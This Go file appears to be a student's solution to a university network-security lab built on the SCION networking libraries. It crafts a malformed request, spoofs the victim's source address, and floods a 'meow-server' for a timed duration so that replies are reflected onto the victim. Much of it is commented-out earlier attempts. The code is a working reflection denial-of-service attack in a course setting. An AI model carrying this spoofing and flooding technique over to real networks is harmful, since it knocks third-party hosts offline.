package client

import (
	// All of these imports were used for the mastersolution

	"fmt"
	"log"
	"net"

	"inet.af/netaddr"

	// TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"time"

	"ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/snet/addrutil"
	"github.com/scionproto/scion/go/lib/sock/reliable"
)

// hostContext contains the information needed to connect to the host's local SCION stack,
// i.e. the connection to sciond and dispatcher.
type hostContext struct {
	ia            addr.IA
	sciond        daemon.Connector
	dispatcher    reliable.Dispatcher
	hostInLocalAS net.IP
}
type scmpHandler struct{}

func GenerateAttackPayload() []byte {
	// Choose which request to send
	var q server.Query = server.Second
	// Use API to build request
	request := server.NewRequest(q, false, false, false, false)
	// serialize the request with the API Marshal function
	d, err := request.MarshalJSON()
	if err != nil {
		fmt.Println(err)
		return make([]byte, 0) // empty paiload on fail
	}
	return d[:10] //trigger a parse error
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher

	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// SCION daemon
	sciondAddr := SCIONDAddress()

	scionDaemon, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}

	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.
	meowSCIONAddr, err := snet.ParseUDPAddr(meowServerAddr)
	if err != nil {
		log.Fatal(err)
	}

	if spoofedAddr.IA == meowSCIONAddr.IA {
		scionNetwork := snet.NewNetwork(meowSCIONAddr.IA, dispatcher, nil)
		conn, err := scionNetwork.Dial(ctx, "udp", spoofedAddr.Host, meowSCIONAddr, addr.SvcNone)
		defer conn.Close()
		if err != nil {
			log.Fatal("Error dialing scion network", err)
		}

		//localIA, err := sciondConn.LocalIA(ctx)
		/*hostInLocalAS, err := findAnyHostInLocalAS(ctx, sciondConn)
		if err != nil {
			log.Fatal("Error finding local host", err)
		}
		fmt.Println("hostInLocalAS", hostInLocalAS)
		hostCtx := hostContext{
			ia:            localIA,
			sciond:        sciondConn,
			dispatcher:    dispatcher,
			hostInLocalAS: hostInLocalAS,
		}
		local, err := defaultLocalAddr(netaddr.IPPort{}, hostCtx)

		rconn, _, err := dispatcher.Register(ctx, localIA, local.UDPAddr(), addr.SvcNone)
		if err != nil {
			log.Fatal("Error registering with dispatcher", err)
		}
		conn := snet.NewSCIONPacketConn(rconn, nil, true)*/

		n_bytes, err := conn.Write(payload)

		/*fmt.Println("meow addr, nexthop", meowSCIONAddr.Host, meowSCIONAddr.NextHop)
		writeBuffer := make([]byte, server.MaxBufferSize)
		pkt := &snet.Packet{
			Bytes: writeBuffer,
			PacketInfo: snet.PacketInfo{
				Source: snet.SCIONAddress{
					IA:   addr.IA(localIA),
					Host: addr.HostFromIP(spoofedAddr.Host.IP),
				},
				Destination: snet.SCIONAddress{
					IA:   addr.IA(localIA),
					Host: addr.HostFromIP(meowSCIONAddr.Host.IP),
				},
				Path: spath.Path{},
				Payload: snet.UDPPayload{
					SrcPort: 61236,
					DstPort: uint16(server.ServerPorts[0]),
					Payload: payload,
				},
			},
		}
		fmt.Println("pkt info is ", pkt.PacketInfo)
		err = conn.WriteTo(pkt, meowSCIONAddr.NextHop)*/
		if err != nil {
			log.Fatal("Write failed", err)
		}

		fmt.Println("Write success, bytes written", n_bytes)

		/*readBuffer := make([]byte, server.MaxBufferSize)
		deadline := time.Now().Add(time.Second * 3)
		err = conn.SetReadDeadline(deadline)
		if err != nil {
			fmt.Println("CLIENT: SetReadDeadline produced an error.", err)
			return
		}*/

		/*pkt1 := snet.Packet{
			Bytes: readBuffer,
		}
		var lastHop net.UDPAddr
		err = conn.ReadFrom(&pkt1, &lastHop)*/

		/*n_bytes, err = conn.Read(readBuffer)
		if err != nil {
			fmt.Println("CLIENT: Error reading from connection.", err)
			return
		}
		fmt.Println("Read success", n_bytes)*/

		attackDuration := AttackDuration()
		for start := time.Now(); time.Since(start) < attackDuration; {
			// make request to meow with spoofed addr
			_, err = conn.Write(payload)
			if err != nil {
				log.Fatal("Write failed", err)
			}
			//fmt.Println("Write success, bytes written", n_bytes)
		}
	} else {
		fmt.Println(spoofedAddr.IA, meowSCIONAddr.IA, spoofedAddr.Host, spoofedAddr.Host.Port, VictimPort())
		scionNetwork := snet.NewNetwork(spoofedAddr.IA, dispatcher, nil)
		paths, err := scionDaemon.Paths(ctx, spoofedAddr.IA, meowSCIONAddr.IA, daemon.PathReqFlags{})
		path := paths[0]

		meowSCIONAddr.Path = path.Path()
		meowSCIONAddr.Path.Reverse()
		meowSCIONAddr.NextHop = path.UnderlayNextHop()

		fmt.Println("localIA, meowScionAddr", scionNetwork.LocalIA, meowSCIONAddr)

		if err != nil {
			log.Fatal("Error fetching paths from scion daemon", err)
		}
		fmt.Println("Fetched paths", paths)

		spoofedAddr.Host.Port = VictimPort()
		conn, err := scionNetwork.Dial(ctx, "udp", spoofedAddr.Host, meowSCIONAddr, addr.SvcNone)

		if err != nil {
			log.Fatal("Error dialing scion network", err)
		}
		n_bytes, err := conn.Write(payload)
		if err != nil {
			log.Fatal("Write failed", err)
		}

		fmt.Println("Write success, bytes written, to, from", n_bytes, conn.RemoteAddr(), conn.LocalAddr())

		/*attackDuration := AttackDuration()
		for start := time.Now(); time.Since(start) < attackDuration; {
			// make request to meow with spoofed addr
			_, err = conn.Write(payload)
			if err != nil {
				log.Fatal("Write failed", err)
			}
			//fmt.Println("Write success, bytes written", n_bytes)
		}*/
	}
	return nil
}

// findAnyHostInLocalAS returns the IP address of some (infrastructure) host in the local AS.
func findAnyHostInLocalAS(ctx context.Context, sciondConn daemon.Connector) (net.IP, error) {
	addr, err := daemon.TopoQuerier{Connector: sciondConn}.UnderlayAnycast(ctx, addr.SvcCS)
	if err != nil {
		return nil, err
	}
	return addr.IP, nil
}

func defaultLocalIP(host hostContext) (netaddr.IP, error) {
	stdIP, err := addrutil.ResolveLocal(host.hostInLocalAS)
	ip, ok := netaddr.FromStdIP(stdIP)
	if err != nil || !ok {
		return netaddr.IP{}, fmt.Errorf("unable to resolve default local address %w", err)
	}
	return ip, nil
}

// defaultLocalAddr fills in a missing or unspecified IP field with defaultLocalIP.
func defaultLocalAddr(local netaddr.IPPort, host hostContext) (netaddr.IPPort, error) {
	if local.IP().IsZero() || local.IP().IsUnspecified() {
		localIP, err := defaultLocalIP(host)
		if err != nil {
			return netaddr.IPPort{}, err
		}
		local = local.WithIP(localIP)
	}
	return local, nil
}
